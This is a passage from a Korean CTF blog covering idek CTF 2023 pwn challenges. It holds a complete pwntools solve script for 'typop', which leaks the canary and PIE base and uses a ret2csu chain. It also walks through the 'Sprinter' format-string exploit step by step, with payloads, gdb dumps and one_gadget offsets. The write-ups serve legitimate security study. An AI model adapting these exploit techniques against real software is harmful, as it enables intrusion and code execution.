<code>win</code> 함수 주소를 넣어줬다. 사전에 stack 주소를 구해놨으니 <code>win</code>함수가 저장되어 있는 stack 주소를 구할 수 있다. 페이로드 글자 수도 문제에서 제한 걸었던 <code>0x5a</code>와 동일하다.</p><h2 id="Solve-Code"><a href="#Solve-Code" class="headerlink" title="Solve Code"></a>Solve Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;typop.chal.idek.team&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chain</span>(<span class="params">rdi, rsi, rdx, buf, csu_call</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#payload += b&#x27;A&#x27; * 8        # add rsp, 8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)           <span class="comment"># pop rbx (dummy)</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)           <span class="comment"># pop rbp (dummy)</span></span><br><span class="line">    payload += p64(rdi)         <span class="comment"># pop r12 -&gt; rdi</span></span><br><span class="line">    payload += p64(rsi)         <span class="comment"># pop r13 -&gt; rsi</span></span><br><span class="line">    payload += p64(rdx)         <span class="comment"># pop r14 -&gt; rdx    </span></span><br><span class="line">    payload += p64(buf)         <span class="comment"># pop r15 -&gt; call [buf]</span></span><br><span class="line">    payload += p64(csu_call)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================================================</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;survey?\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;ctf?\n&#x27;</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">10</span> + <span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (1) canary, stack leak</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\x00&#x27;</span> + p.recv(<span class="number">7</span>))</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;canary: &#x27;</span>+ <span class="built_in">hex</span>(canary))</span><br><span class="line">info(<span class="string">&#x27;stack: &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback?\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">10</span> + p64(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==========================================================</span></span><br><span class="line"><span class="comment"># (2) pie base leak</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;survey?\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;ctf?\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">10</span> + <span class="string">b&#x27;B&#x27;</span>*<span class="number">8</span> + <span class="string">b&#x27;C&#x27;</span>*<span class="number">7</span> + <span class="string">b&#x27;D&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">pie_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1447</span> </span><br><span class="line">info(<span class="string">&#x27;pie base: &#x27;</span> + <span class="built_in">hex</span>(pie_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># (3) for csu_gadget</span></span><br><span class="line">win = pie_base + e.sym[<span class="string">&#x27;win&#x27;</span>]</span><br><span class="line">csu_init = pie_base + <span class="number">0x14ca</span></span><br><span class="line">csu_call = pie_base + <span class="number">0x14b0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (3)</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x12</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(win)             <span class="comment"># stack addr</span></span><br><span class="line"></span><br><span class="line">payload += p64(csu_init)</span><br><span class="line">payload += chain(<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;l&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), stack-<span class="number">0x10</span>, csu_call)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idek&#123;2_guess_typos_do_matter&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> idek </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idek CTF 2023 - Sprinter (*FSB*)</title>
      <link href="/230117-idekctf2023-sprinter/"/>
      <url>/230117-idekctf2023-sprinter/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1839">https://ctftime.org/event/1839</a></li></ul><blockquote><p>I’ve always found myself to be more of a distance runner than a sprinter, but sometimes you just have to sprint that final stretch.<br><code>nc sprinter.chal.idek.team 1337</code></p></blockquote><ul><li>[25 solves &#x2F; 489 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Canary                        : ✓ (value: 0xfe2ac7e4ac5ec700)</span><br><span class="line">NX                            : ✓ </span><br><span class="line">PIE                           : ✘ </span><br><span class="line">Fortify                       : ✘ </span><br><span class="line">RelRO                         : Partial</span><br></pre></td></tr></table></figure><p><code>canary</code>가 존재한다. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your string into my buffer, located at %p: &quot;</span>, buf);</span><br><span class="line">  fgets(buf, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v0 = (<span class="type">size_t</span>)<span class="built_in">strchr</span>(buf, <span class="string">&#x27;n&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> ( v0 &lt;= <span class="number">0x26</span> )</span><br><span class="line">      LODWORD(v0) = <span class="built_in">sprintf</span>(buf, buf); <span class="comment">// [*]</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>[*]</code> 에서 <code>Format String Bug</code>가 터진다. 안타깝게도 <code>n</code>을 필터링하고, <code>sprintf(buf, buf)</code> 형식으로 버그가 발생하기 때문에 문제 풀기 굉장히 까다롭다. 페이로드를 적어놨는데 포맷스트링을 실행(?)하면서 내가 적어놨던 페이로드가 덮힐 수도 있기 때문이다. </p><p>문제를 보며 가장 먼저 생각이 들었던 것은 <code>n</code>이 필터링 되어 있는데 어떻게 overflow를 일으켜서 어떻게 ret를 변조하느냐였다. 더욱이 canary가 존재했기 때문에 이것을 어떻게 우회하거나 leak할 지도 고민이었다. 하지만 여러가지 테스트를 진행한 결과 <code>%c</code> 등을 이용해서 overflow를 쉽게 일으킬 수 있었고 canary를 미리 구해놓는 과정이 필요하다고 판단했다.</p><p>이 문제가 까다로운 점이 한 가지 더 존재한다. 바로 페이로드의 길이 제한인데, <code>strlen</code>을 이용해서 페이로드의 길이를 구하고 있다. </p><p>이 문제의 환경은 <code>Ubuntu 20.04</code>이며 다행히 작동하는 <code>one gadget</code>이 존재한다. (문제 파일에 libc가 함께 포함되어 있다.)</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ul><li><a href="https://uz56764.tistory.com/83">https://uz56764.tistory.com/83</a></li></ul><p>기간 내에 이 문제를 풀지 못했기 때문에 위 블로그를 참고하여 공부를 진행했다.</p><h3 id="0-c"><a href="#0-c" class="headerlink" title="0. $[]%[]c"></a>0. <code>$[]%[]c</code></h3><p>뻘하게 헷갈렸던 개념이다.. 정확히는 <code>$[offset]%[num]c</code>으로 정의하고 싶다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%100c\n&quot;</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>이것의 출력 결과는 무엇일까? 99번 공백을 출력하고 마지막에 ‘A’를 출력한다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%100s\n&quot;</span>, <span class="string">&quot;AA&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>자매품으로 이것의 출력 결과는 98번 공백을 출력하고 마지막에 ‘AA’를 출력한다.</p><p><code>$[offset]</code>의 의미는.. <code>FSB</code>에서 많이 보던 바로 그거다. offset 번째를 참조한다. 만약 <code>%10$264c</code>라면 먼저 공백 264개를 출력하고 10번째 offset을 참조한 값을 출력할 것이다.</p><h3 id="1-Canary-보존"><a href="#1-Canary-보존" class="headerlink" title="1. Canary 보존"></a>1. Canary 보존</h3><p>제일 먼저 해야할 일은 <code>canary</code>를 보존해야하는 것이다. (어떻게 보면 이 문제의 핵심이라고도 할 수 있겠다.) 그 전에 <code>canary</code> 직전까지 덮어보자.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%10$264c&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="comment"># padding</span></span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x26</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">payload += p8(<span class="number">0x41</span>)   <span class="comment"># 10</span></span><br></pre></td></tr></table></figure><p>한 블록은 8바이트이기 때문에 패딩을 저렇게 줘야한다. 가독성을 위해 두 번 나누어서 작성했는데, 0x26의 의미는 문제에서 요구한 길이 제한이다.</p><p>payload를 저렇게 작성하게 되면 10번째 offset을 참고하여 264번의 공백 출력 후 마지막에 0x41을 출력한다. gdb 상에서 확인해보면 아래와 같다.</p><ul><li><code>FSB</code> 일으키기 전</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x007ffc4a31cb80│+0x0000: &quot;%10$264c&quot;     ← $rdx, $rsp, $rsi, $rdi, $r8</span><br><span class="line">0x007ffc4a31cb88│+0x0008: 0x0000000000000000        # 6</span><br><span class="line">0x007ffc4a31cb90│+0x0010: 0x0000000000000000        # 7</span><br><span class="line">0x007ffc4a31cb98│+0x0018: 0x0000000000000000        # 8</span><br><span class="line">0x007ffc4a31cba0│+0x0020: 0x0000000000000000        # 9</span><br><span class="line">0x007ffc4a31cba8│+0x0028: 0x00034000000a41 (&quot;A\n&quot;?) # 10</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li><code>FSB</code> 일으킨 후</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x7ffc4a31cb80: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cb90: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cba0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbb0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbc0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbd0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbe0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cbf0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc00: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc10: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc20: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc30: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc40: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc50: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc60: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc70: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffc4a31cc80: 0x4120202020202020      0x5207f53f7a984d00</span><br><span class="line">0x7ffc4a31cc90: 0x00007ffc4a31cca0      0x00000000004012fd</span><br></pre></td></tr></table></figure><p>본격적으로 <code>canary</code> 보존을 시작해보자. <code>ret</code>를 덮기 위해서는 필수적으로 <code>canary</code>를 건드려야만 한다. 우리는 <code>FSB</code>를 이용하여 <code>canary</code>를 구한 다음에 써야 한다. 즉, 앞에서 말한 <code>canary</code> 보존은 <code>canary</code>를 leak한 다음 그 자리에 다시 써야하는 것을 의미한다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%5$264c&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%4$c&#x27;</span>   <span class="comment"># 0x00</span></span><br><span class="line">payload += <span class="string">b&#x27;%10$.7s&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # padding</span></span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x26</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">payload += p64(canary_addr + <span class="number">1</span>)     <span class="comment"># 10</span></span><br></pre></td></tr></table></figure><p><code>5번째</code> 오프셋은 <code>0x25</code>를 의미하고 <code>4번째</code> 오프셋은 <code>r9</code> 레지스터인 <code>0x00</code>이다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fff9a4022f0: 0x2563343632243525</span><br></pre></td></tr></table></figure><p><code>10번째</code> 오프셋은 <code>canary_addr + 1</code>을 의미하는데 <code>+1</code>의 의미는 <code>canary</code>는 <code>null</code> 바이트부터 시작하기 때문이다. 그래서 <code>canary_addr + 1</code>부터 <code>%.7s</code>를 이용하여 7자리만 가져왔다. 앞에서 <code>%4$c</code>으로 <code>null</code> 바이트 한 바이트만 가져왔기 때문에 <code>canary</code>가 잘 보존되었으리라 생각된다. </p><p><code>%s</code>를 이용하여 카나리를 전부 다 가져오게 되면 <code>null</code> 바이트 때문에 <code>sprint</code> 함수로 <code>canary</code> 출력을 하다가 끊긴다. 사실상 첫 바이트가 <code>null</code>이기 때문에 전혀 출력을 하지 못한다. 그래서 위와 같은 방법으로 출력을 해야한다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x7fff9a4022f0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402300: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402310: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402320: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402330: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402340: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402350: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402360: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402370: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402380: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a402390: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023a0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023b0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023c0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023d0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023e0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7fff9a4023f0: 0x2520202020202020      0x92c29f2c0e8fb100</span><br><span class="line">0x7fff9a402400: 0x00007fff9a402400      0x00000000004012fd</span><br></pre></td></tr></table></figure><p><code>canary</code> 보존에 성공했으면 <code>rbp</code>를 덮고 <code>ret</code>를 원하는 곳으로 돌려주면 끝이다.</p><h3 id="2-ret를-덮어-흐름-변경하기"><a href="#2-ret를-덮어-흐름-변경하기" class="headerlink" title="2. ret를 덮어 흐름 변경하기"></a>2. <code>ret</code>를 덮어 흐름 변경하기</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;AAA%5$261c&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%4$c&#x27;</span>  <span class="comment"># 0x00</span></span><br><span class="line">payload += <span class="string">b&#x27;%10$.7s&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rbp</span></span><br><span class="line">payload += <span class="string">b&#x27;%8c&#x27;</span></span><br><span class="line"><span class="comment"># ret</span></span><br><span class="line">payload += <span class="string">b&#x27;%12$.3s%11$.5s&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># padding</span></span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x26</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">payload += p64(canary_addr + <span class="number">1</span>)        <span class="comment"># 10 canary</span></span><br><span class="line">payload += p64(canary_addr + <span class="number">8</span>*<span class="number">4</span> + <span class="number">3</span>)  <span class="comment"># 11 libc</span></span><br><span class="line">payload += p64(stack_leak)             <span class="comment"># 12 stack</span></span><br></pre></td></tr></table></figure><p><code>sprintf(buf, buf);</code>으로 <code>FSB</code>가 트리거 될 때 익스하는 것에서 가장 까다로운 점은 페이로드를 적어놓은 <code>buf</code>가 포맷스트링에 의해 덮힐 가능성이 존재한다는 것이다. 그래서 우리는 실행하고 싶은 주소를 페이로드 제일 앞에 적어주어 덮히지 않게 해야 한다. </p><p><code>ret</code> 부분의 포맷스트링을 해석해보면 12번째 오프셋에서 3바이트를 가져오고 11번째 오프셋에서 5바이트를 가져오는 것을 의미한다. 12번째 오프셋에는 스택 주소가 적혀져 있으며 페이로드 첫 부분 3바이트를 가져오는 것을 의미한다. 11번째 오프셋은 libc 주소가 저장되어 있는데 정확한 값은 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7f 78 55 18 d0 83</span><br></pre></td></tr></table></figure><p><code>aslr</code> 때문에 하위 1.5바이트를 제외하고 계속 변경된다. 우리가 사용할 <code>one gadget</code> offset은 3바이트이므로 5바이트만 정확한 값을 쓰고 나머지 3바이트를 <code>one gadget</code> offset을 사용한다. 물론 이 값은 페이로드 가장 첫 부분에 적혀 있어야 한다. 일단 이 부분은 <code>AAA</code>로 값을 적어놓고 3 글자 썼기 때문에 <code>%264c</code>를 <code>%261c</code>로 변경하였다. </p><p>이제 gdb 상으로 메모리를 살펴보자.</p><ul><li><code>FSB</code> 일으키기 전</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x007ffd1f0d4bb0│+0x0000: &quot;AAA%5$261c%4$c%10$.7s%8c%12$.3s%11$.5s&quot;       ← $rdx, $rsp, $rsi, $rdi, $r8</span><br><span class="line">0x007ffd1f0d4bb8│+0x0008: &quot;1c%4$c%10$.7s%8c%12$.3s%11$.5s&quot;</span><br><span class="line">0x007ffd1f0d4bc0│+0x0010: &quot;0$.7s%8c%12$.3s%11$.5s&quot;</span><br><span class="line">0x007ffd1f0d4bc8│+0x0018: &quot;%12$.3s%11$.5s&quot;</span><br><span class="line">0x007ffd1f0d4bd0│+0x0020: 0x0073352e243131 (&quot;11$.5s&quot;?)</span><br><span class="line">0x007ffd1f0d4bd8│+0x0028: 0x007ffd1f0d4cb9  →  0xd0edc89128c0bcb7</span><br><span class="line">0x007ffd1f0d4be0│+0x0030: 0x007ffd1f0d4cdb  →  0x00001800007f7855</span><br></pre></td></tr></table></figure><ul><li><code>FSB</code> 일으킨 후</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0x7ffd1f0d4bb0: 0x2020202020414141      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4bc0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4bd0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4be0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4bf0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c00: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c10: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c20: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c30: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c40: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c50: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c60: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c70: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c80: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c90: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4ca0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4cb0: 0x4120202020202020      0xedc89128c0bcb700</span><br><span class="line">0x7ffd1f0d4cc0: 0xb020202020202020      0x00007f7855414141</span><br><span class="line">0x7ffd1f0d4cd0: 0x0000000000000000      0x00007f785518d083</span><br></pre></td></tr></table></figure><p><code>ret</code>가 <code>0x00007f7855414141</code>로 잘 변조 되었다.</p><img src="/images/230117-idekctf2023-sprinter/Screenshot 2023-01-17 at 20.44.01.png" width=450/><br><p>이제 <code>one gadget</code>을 이용하여 exploit을 진행해보자.</p><h3 id="3-offset-Brute-forcing"><a href="#3-offset-Brute-forcing" class="headerlink" title="3. offset Brute forcing"></a>3. offset Brute forcing</h3><p>사용할 <code>one gadget</code> 오프셋은 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == 